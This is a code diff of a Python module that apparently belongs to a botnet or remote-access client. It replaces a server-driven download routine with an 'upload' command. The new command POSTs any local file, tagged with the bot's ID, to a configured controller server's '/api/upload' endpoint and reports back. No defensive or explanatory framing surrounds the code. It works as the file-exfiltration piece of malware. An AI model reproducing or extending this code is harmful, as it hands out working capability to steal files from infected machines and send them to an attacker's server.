@@ -1,20 +1,10 @@
+import requests
 import os
-import base64
 
-import server
+import utils
+import settings
 
 
-def run():
-    filepath = server.hello()
-    localfile = os.path.basename(filepath)
-    while os.path.exists(localfile):
-        localfile = "up_" + localfile
-    fd = open(localfile, 'wb')
-    while True:
-        file_data = server.hello()
-        if file_data == "END_OF_FILE":
-            break
-        chunk = base64.b64decode(file_data)
-        fd.write(chunk)
-    fd.close()
-    server.tell('')
+def run(filename):
+    r = requests.post(settings.SERVER_URL + "/api/upload", {'botid': settings.BOT_ID, 'src': os.path.basename(filename)}, files={'uploaded': open(filename, 'rb')})
+    utils.send_output("Uploaded: %s -> %s" % (filename,  os.path.basename(filename)))
